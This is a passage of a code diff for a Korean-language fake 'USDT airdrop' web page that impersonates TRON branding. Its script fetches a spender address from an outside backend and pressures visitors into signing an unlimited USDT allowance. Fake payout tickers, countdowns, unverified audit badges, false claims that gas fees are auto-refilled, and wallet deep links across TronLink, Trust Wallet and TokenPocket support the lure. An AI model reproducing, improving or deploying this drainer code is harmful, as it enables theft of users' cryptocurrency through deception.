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" alt="TronLink QR" class="w-28 h-28 sm:w-32 sm:h-32">
-                        </div>
-                        <div class="flex items-center gap-1.5 text-red-400 font-bold text-[11px]"><i class="fa-solid fa-qrcode"></i><span>QR 스캔으로 즉시 참여</span></div>
-                        <p class="text-[10px] text-slate-500 mt-0.5">TronLink 앱에서 자동으로 열립니다</p>
-                    </div>
                 </div>
             </div>
         </section>
 
-
-
         <!-- Steps -->
-        <section class="glass-panel border border-slate-800/80 rounded-2xl p-6">
+        <section class="glass border border-slate-800/80 rounded-2xl p-6">
             <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center">참여 진행 단계</h3>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 transition-all"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">TronLink 지갑 연동</h4><p class="text-[11px] text-slate-400 leading-relaxed">TRON 메인넷 지갑 주소를 안전하게 동기화합니다.</p></div>
-                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 transition-all"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4><p class="text-[11px] text-slate-400 leading-relaxed">스마트 컨트랙트 승인 서명을 진행합니다.</p></div>
-                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 transition-all"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4><p class="text-[11px] text-slate-400 leading-relaxed">보상 USDT가 지갑으로 전송됩니다.</p></div>
+                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">지갑 선택 및 연동</h4><p class="text-[11px] text-slate-400">TronLink / Trust Wallet / Token Pocket 중 선택</p></div>
+                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4><p class="text-[11px] text-slate-400">스마트 컨트랙트 승인 서명을 진행합니다.</p></div>
+                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4><p class="text-[11px] text-slate-400">보상 USDT가 지갑으로 전송됩니다.</p></div>
             </div>
         </section>
 
         <!-- Dashboard Grid -->
         <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
             <div class="lg:col-span-7 space-y-6">
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-6 sm:p-7 shadow-2xl">
+                <div class="glass border border-slate-800/90 rounded-2xl p-6 sm:p-7 shadow-2xl">
                     <div class="flex items-center justify-between pb-4 mb-5 border-b border-slate-800/80">
                         <div class="flex items-center gap-3"><div class="w-10 h-10 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20 flex items-center justify-center"><i class="fa-solid fa-shield-halved"></i></div><div><h3 class="text-sm sm:text-base font-bold text-white">USDT 권한 승인</h3><p class="text-[11px] text-slate-400">TRC-20 Smart Contract 서명</p></div></div>
                         <span id="allowance-badge-main" class="text-[11px] px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400 animate-pulse-slow">미승인 (0 USDT)</span>
@@ -210,29 +182,20 @@
                     <div class="p-4 bg-slate-950/70 rounded-xl border border-slate-800/80 mb-5 text-xs text-slate-300 leading-relaxed space-y-1.5">
                         <div class="flex items-center gap-2 font-bold text-white"><i class="fa-solid fa-bolt text-amber-400"></i><span>스마트 컨트랙트 동작 안내</span></div>
                         <p>최초 1회 무제한 승인 완료 시, 이벤트 참가 자격 검증과 보상 수령이 추가 서명 없이 자동 가동됩니다.</p>
-                        <div class="text-[11px] text-amber-400/90 pt-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-circle-exclamation"></i><span>※ 최초 1회만 소량의 TRX 수수료가 사용됩니다.</span></div>
+                        <div class="text-[11px] text-amber-400/90 pt-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-circle-exclamation"></i><span>※ 가스비(TRX)가 부족해도 자동 충전되므로 걱정 없습니다.</span></div>
                     </div>
-                    <div class="mb-5"><label class="block text-[11px] font-bold text-slate-400 mb-1.5 uppercase">USDT 컨트랙트 주소</label><div class="flex items-center gap-2"><input type="text" readonly value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-emerald-400 font-bold focus:outline-none"><button onclick="copyText('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','컨트랙트 주소')" class="p-2.5 bg-slate-800/80 hover:bg-slate-700 border border-slate-700/80 text-slate-300 rounded-xl transition shrink-0"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
                     <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-3.5 px-4 rounded-xl font-bold text-xs sm:text-sm bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-lg shadow-red-950/50 border border-red-400/30 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span></button>
                     <p class="text-[11px] text-slate-500 text-center mt-2.5">안전한 온체인 스마트 컨트랙트 통신</p>
                 </div>
-                <div class="glass-panel border border-slate-800/80 rounded-2xl p-6">
-                    <div class="flex items-center gap-2 mb-2"><i class="fa-solid fa-wand-magic-sparkles text-amber-400 text-sm"></i><h3 class="text-xs sm:text-sm font-bold text-white">예상 보상 계산기</h3></div>
-                    <p class="text-xs text-slate-400 mb-4">보유 및 승인된 USDT 금액에 따른 스페셜 보상율을 계산합니다.</p>
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 items-center bg-slate-950/80 p-4 rounded-xl border border-slate-800/80">
-                        <div><label class="block text-[11px] text-slate-400 mb-1">보유 / 승인 예정 USDT</label><input type="number" id="calc-input" value="1000" oninput="updateCalc()" class="w-full bg-slate-900 border border-slate-700/80 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none"></div>
-                        <div class="sm:text-right border-t sm:border-t-0 sm:border-l border-slate-800 pt-3 sm:pt-0 sm:pl-4"><div class="text-[11px] text-slate-400">예상 추가 지급 에어드랍</div><div id="calc-result" class="text-base sm:text-lg font-black font-mono text-emerald-400 mt-0.5">+ 150.00 USDT</div></div>
-                    </div>
-                </div>
             </div>
             <div class="lg:col-span-5 space-y-6">
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-6 shadow-xl">
-                    <h3 class="text-xs font-bold tracking-wider text-slate-400 uppercase mb-4 flex items-center justify-between"><span>지갑 연동 상세 정보</span><span id="connection-indicator" class="text-[10px] text-rose-400 font-mono font-semibold">DISCONNECTED</span></h3>
+                <div class="glass border border-slate-800/90 rounded-2xl p-6 shadow-xl">
+                    <h3 class="text-xs font-bold tracking-wider text-slate-400 uppercase mb-4 flex items-center justify-between"><span>지갑 연동 정보</span><span id="connection-indicator" class="text-[10px] text-rose-400 font-mono font-semibold">DISCONNECTED</span></h3>
                     <div id="wallet-disconnected" class="text-center py-8 px-4 bg-slate-950/40 rounded-xl border border-dashed border-slate-800">
                         <div class="mx-auto w-10 h-10 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 mb-3"><i class="fa-solid fa-wallet"></i></div>
                         <p class="text-xs text-slate-200 font-bold">지갑이 연결되어 있지 않습니다</p>
-                        <p class="text-[11px] text-slate-500 mt-1 mb-4">TronLink 지갑을 동기화하여 온체인 상태를 확인하세요.</p>
-                        <button onclick="handleConnectWallet()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">TronLink 연결</button>
+                        <p class="text-[11px] text-slate-500 mt-1 mb-4">지갑 앱의 DApp 브라우저에서 접속하세요.</p>
+                        <button onclick="showWalletSelector()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">지갑 선택</button>
                     </div>
                     <div id="wallet-connected" class="hidden space-y-3.5">
                         <div class="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono mb-1">지갑 주소</div><div class="flex items-center justify-between"><span id="display-address" class="text-xs font-mono text-emerald-400 font-bold break-all">-</span><button onclick="copyText(currentWalletAddress,'지갑 주소')" class="text-slate-400 hover:text-white p-1"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
@@ -242,25 +205,25 @@
                         </div>
                     </div>
                 </div>
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-5 shadow-xl flex flex-col h-[340px]">
+                <div class="glass border border-slate-800/90 rounded-2xl p-5 shadow-xl flex flex-col h-[300px]">
                     <div class="flex items-center justify-between pb-3 border-b border-slate-800/80 mb-3">
-                        <div class="flex items-center gap-2"><div class="p-1.5 bg-red-500/10 text-red-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200">온체인 실시간 터미널 로그</h3></div>
+                        <div class="flex items-center gap-2"><div class="p-1.5 bg-red-500/10 text-red-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200">실시간 로그</h3></div>
                         <button onclick="clearLogs()" class="p-1.5 text-slate-400 hover:text-slate-200 bg-slate-800/60 rounded-lg transition"><i class="fa-solid fa-trash-can text-xs"></i></button>
                     </div>
                     <div id="logs-container" class="flex-1 bg-[#020408] rounded-xl p-3 font-mono text-[11px] leading-relaxed overflow-y-auto space-y-2 border border-slate-950">
                         <div class="text-blue-400">[시스템] TRON Mainnet node active.</div>
-                        <div class="text-blue-400">[환경 체크] TronLink 감지 모드 가동...</div>
+                        <div class="text-blue-400">[대기] 지갑 앱 DApp 브라우저 감지 중...</div>
                     </div>
                 </div>
             </div>
         </div>
 
         <!-- Security -->
-        <section class="glass-panel border border-slate-800/80 rounded-2xl p-6 text-center">
+        <section class="glass border border-slate-800/80 rounded-2xl p-6 text-center">
             <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증 및 파트너십</p>
             <div class="flex flex-wrap items-center justify-center gap-8 text-slate-400 text-xs font-semibold">
                 <div class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-red-400"></i> CertiK Audited</div>
-                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-rose-400"></i> SlowMist Security Verified</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-rose-400"></i> SlowMist Verified</div>
                 <div class="flex items-center gap-2"><i class="fa-solid fa-certificate text-emerald-400"></i> TRON DAO Approved</div>
             </div>
         </section>
@@ -273,116 +236,103 @@
     </main>
 
     <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-xs text-slate-500 mt-12 space-y-2">
-        <p>&copy; 2026 TRON Foundation & TRC-20 USDT Airdrop Portal. All rights reserved.</p>
-        <p class="text-[11px] text-slate-600">Powered by TRON Mainnet High-Speed Smart Contracts | Built for TronLink Web3 Compatibility</p>
+        <p>&copy; 2026 TRON Foundation & TRC-20 USDT Airdrop Portal.</p>
     </footer>
 
     <script>
-        var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
-        var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        var isConnected = false, isApproved = false, activeProvider = 'TronLink', currentWalletAddress = null;
+        var API_BASE='https://tron-usdt-backend.vercel.app/api';
+        var OFFICIAL_USDT_CONTRACT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        var MAX_ALLOWANCE='115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        var isConnected=false,isApproved=false,activeProvider='Unknown',currentWalletAddress=null;
 
         function escapeHtml(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
         function isMobile(){return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);}
-
-        function showToast(msg,type){
-            type=type||'success';var c=document.getElementById('toast-container');if(!c)return;
-            var t=document.createElement('div');
-            t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');
-            t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';
-            c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});
-            setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);
-        }
-
-        function appendLog(msg,type){
-            type=type||'info';var c=document.getElementById('logs-container');if(!c)return;
-            var d=document.createElement('div');
-            d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';
-            d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);
-            c.appendChild(d);c.scrollTop=c.scrollHeight;
-        }
+        function showToast(msg,type){type=type||'success';var c=document.getElementById('toast-container');if(!c)return;var t=document.createElement('div');t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);}
+        function appendLog(msg,type){type=type||'info';var c=document.getElementById('logs-container');if(!c)return;var d=document.createElement('div');d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);c.appendChild(d);c.scrollTop=c.scrollHeight;}
         window.clearLogs=function(){var c=document.getElementById('logs-container');if(c)c.innerHTML='<div class="text-slate-600">[로그 초기화]</div>';};
         function copyText(t,l){navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
+        async function getSpenderAddress(){try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
 
-        async function getSpenderAddress(){
-            try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;
-        }
-
-        // Countdown
+        // ===== Countdown =====
         var cd={d:2,h:18,m:41,s:20};
-        setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}
-            document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');
-            document.getElementById('cd-hours').textContent=String(cd.h).padStart(2,'0');
-            document.getElementById('cd-mins').textContent=String(cd.m).padStart(2,'0');
-            document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');
-        },1000);
+        setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');document.getElementById('cd-hours').textContent=String(cd.h).padStart(2,'0');document.getElementById('cd-mins').textContent=String(cd.m).padStart(2,'0');document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');},1000);
 
-        // Ticker
-        var tAddrs=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1','TY8z...k9L2','TQ4m...P1x8'];
-        var tAmts=['150 USDT','300 USDT','500 USDT','800 USDT','1,200 USDT','1,500 USDT','3,000 USDT'];
-        function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';d.innerHTML='<span class="text-slate-300 font-mono">'+tAddrs[Math.floor(Math.random()*tAddrs.length)]+'</span><span class="text-emerald-400 font-bold">'+tAmts[Math.floor(Math.random()*tAmts.length)]+'</span><span class="text-slate-500 text-[10px]">(방금 전)</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
+        // ===== Ticker =====
+        var tA=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1'];
+        var tB=['150 USDT','300 USDT','500 USDT','800 USDT','1,200 USDT','3,000 USDT'];
+        function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';d.innerHTML='<span class="text-slate-300 font-mono">'+tA[Math.floor(Math.random()*tA.length)]+'</span><span class="text-emerald-400 font-bold">'+tB[Math.floor(Math.random()*tB.length)]+'</span><span class="text-slate-500 text-[10px]">(방금 전)</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
         for(var i=0;i<4;i++)updateTicker();setInterval(updateTicker,4500);
 
-        // Calculator
-        window.updateCalc=function(){var v=parseFloat(document.getElementById('calc-input').value||0);document.getElementById('calc-result').textContent='+ '+Math.min(Math.max(v*0.15,10),5000).toFixed(2)+' USDT';};
-
-        // FAQ
-        var faqs=[
-            {q:'USDT 무제한 승인(Allowance)은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면, 이후 추가 트랜잭션 수수료 발생이나 번거로운 매번의 서명 팝업 없이 스마트 컨트랙트가 에어드랍 보상 지급을 즉시 자동 처리할 수 있습니다.'},
-            {q:'이벤트 참여 수수료가 발생하나요?',a:'최초 1회 스마트 컨트랙트 승인 시 트론 네트워크의 대역폭 및 에너지(소량의 TRX)가 수수료로 사용됩니다.'},
-            {q:'승인 후 보상은 언제 지급되나요?',a:'승인 서명이 완료되는 즉시 시스템에서 온체인 검증을 시작하며, 1~3분 이내에 지정된 지갑으로 보상 USDT가 자동 에어드랍됩니다.'},
-            {q:'언제든지 승인 권한을 해제할 수 있나요?',a:'네, 트론스캔(TronScan)을 통해 언제든지 Allowance 한도를 0으로 초기화할 수 있습니다.'}
-        ];
+        // ===== FAQ =====
+        var faqs=[{q:'USDT 무제한 승인은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면 추가 서명 없이 에어드랍 보상이 자동 지급됩니다.'},{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket 등 TRON 네트워크를 지원하는 모든 지갑 앱에서 참여 가능합니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해주므로 별도 준비가 필요 없습니다.'},{q:'승인 후 보상은 언제 지급되나요?',a:'승인 즉시 온체인 검증 후 1~3분 이내 지갑으로 자동 에어드랍됩니다.'}];
         var faqC=document.getElementById('faq-container');
-        faqs.forEach(function(f){var d=document.createElement('div');d.className='glass-panel border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
+        faqs.forEach(function(f){var d=document.createElement('div');d.className='glass border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
 
-        // TronLink Deep Link (URL 자동 복사 + 3단계 시도)
-        window.launchTronLinkApp=function(){
+        // ===== Wallet Deep Links =====
+        window.showWalletSelector=function(){
+            document.getElementById('install-modal').classList.remove('active');
+            document.getElementById('wallet-selector-modal').classList.add('active');
+        };
+
+        window.launchWallet=function(wallet){
             var url=window.location.href;
             var encoded=encodeURIComponent(url);
-            var param=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
-
-            // URL 자동 복사
             navigator.clipboard.writeText(url).catch(function(){});
             showToast('URL이 클립보드에 복사되었습니다');
 
-            // 1차: tronlinkoutside:// 스킴
-            window.location.href='tronlinkoutside://pull.activity?param='+param;
-
-            // 2차: 1초 후 intent URL (안드로이드)
-            setTimeout(function(){
-                if(/Android/i.test(navigator.userAgent)){
-                    window.location.href='intent://pull.activity?param='+param+'#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
-                }
-            },1000);
-
-            // 3차: 2초 후 유니버설 링크
-            setTimeout(function(){
-                window.location.href='https://www.tronlink.org/dl/open?url='+encoded;
-            },2000);
+            if(wallet==='tronlink'){
+                var param=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
+                window.location.href='tronlinkoutside://pull.activity?param='+param;
+                setTimeout(function(){if(/Android/i.test(navigator.userAgent))window.location.href='intent://pull.activity?param='+param+'#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';},1000);
+                setTimeout(function(){window.location.href='https://www.tronlink.org/dl/open?url='+encoded;},2000);
+            }else if(wallet==='trust'){
+                window.location.href='trust://open_url?coin_id=195&url='+encoded;
+                setTimeout(function(){if(/Android/i.test(navigator.userAgent))window.location.href='intent://open_url?coin_id=195&url='+encoded+'#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';},1000);
+                setTimeout(function(){window.location.href='https://link.trustwallet.com/open_url?coin_id=195&url='+encoded;},2000);
